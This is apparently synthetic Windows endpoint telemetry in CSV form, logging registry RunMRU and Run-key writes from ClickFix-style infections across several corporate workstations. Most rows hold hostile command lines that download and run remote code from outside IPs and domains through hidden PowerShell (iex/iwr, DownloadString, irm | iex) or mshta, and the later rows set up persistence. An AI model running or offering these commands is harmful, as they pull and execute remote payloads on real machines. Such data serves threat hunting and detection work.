Timestamp,DeviceId,DeviceName,ActionType,RegistryKey,RegistryValueName,RegistryValueData,InitiatingProcessFileName,InitiatingProcessId,InitiatingProcessSHA1,AccountName,AccountDomain,AccountSid,ReportId
2026-03-01T17:01:50.000Z,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,CORP-WS-001,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1001\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,a,"powershell.exe -W Hidden -NonInteractive -NoP -Ep Bypass -c ""iex(iwr('https://91.242.33.14/stage2.ps",explorer.exe,4074,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,jsmith,CORP,S-1-5-21-3456789012-1234567890-987654321-1001,2369b584ff5e9ff0ff50bde4382567b8
2026-03-02T21:36:33.000Z,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,CORP-WS-002,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1002\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,a,powershell.exe -WindowStyle Hidden -EncodedCommand aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwAxADkAM,explorer.exe,4206,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,mjones,CORP,S-1-5-21-3456789012-1234567890-987654321-1002,8181a8cc369147eb89a2688b12c136e0
2026-03-03T18:01:45.000Z,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,CORP-WS-003,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,a,"powershell.exe -W Hidden -NoP -c ""IEX(New-Object Net.WebClient).DownloadString('https://cdn-update.l",explorer.exe,4384,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,abrown,CORP,S-1-5-21-3456789012-1234567890-987654321-1003,e4855aa1016b6287b00805cca7f36ae9
2026-03-04T20:20:24.000Z,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,CORP-WS-004,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1004\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,a,"powershell.exe -ep bypass -w hidden -nop -c ""irm https://185.220.101.45/ldr | iex""",explorer.exe,4688,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,kwilliams,CORP,S-1-5-21-3456789012-1234567890-987654321-1004,46b98991e14eb70db380c73a989d9d4a
2026-03-05T18:10:18.000Z,e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,CORP-LT-001,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1005\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,b,mshta.exe https://clearfake-cdn.shop/update.hta,explorer.exe,4837,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,ldavis,CORP,S-1-5-21-3456789012-1234567890-987654321-1005,e17f29e17028604649bc473fed7bf656
2026-03-06T22:02:42.000Z,f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,CORP-LT-002,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1006\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,b,"mshta.exe ""javascript:a=new ActiveXObject('WScript.Shell');a.Run('powershell -w hidden -c iex(iwr ht",explorer.exe,5003,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,rthomas,CORP,S-1-5-21-3456789012-1234567890-987654321-1006,80759f1f87e5f0fe5da8d6d2f8b38a8b
2026-03-07T22:13:55.000Z,a1b2c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3,CORP-LT-003,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1007\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,b,mshta.exe https://185.234.247.12/verify.hta,explorer.exe,5130,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,cmartin,CORP,S-1-5-21-3456789012-1234567890-987654321-1007,f7e8f8e50d2b91efb8976ec5ea74bb18
2026-03-18T01:14:22.000Z,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,CORP-WS-001,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,CrashFixUpdater,mshta.exe https://91.242.33.14/persist.hta,powershell.exe,7263,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,abrown,CORP,S-1-5-21-3456789012-1234567890-987654321-1003,2f8c83e56e8d9644601bfbcbf0eebcce
2026-03-18T22:10:27.000Z,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,CORP-WS-002,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,WindowsHelper,mshta.exe https://185.220.101.45/loader.hta,powershell.exe,7337,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,kwilliams,CORP,S-1-5-21-3456789012-1234567890-987654321-1004,c85cd7147bf695524cbc90446bcd5ce7
2026-03-19T23:28:51.000Z,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,CORP-WS-003,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,SysMonitor,mshta.exe https://194.165.16.11/run.hta,powershell.exe,7415,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,ldavis,CORP,S-1-5-21-3456789012-1234567890-987654321-1005,d1a7ba2011b461e9b15da72dd4cee27c
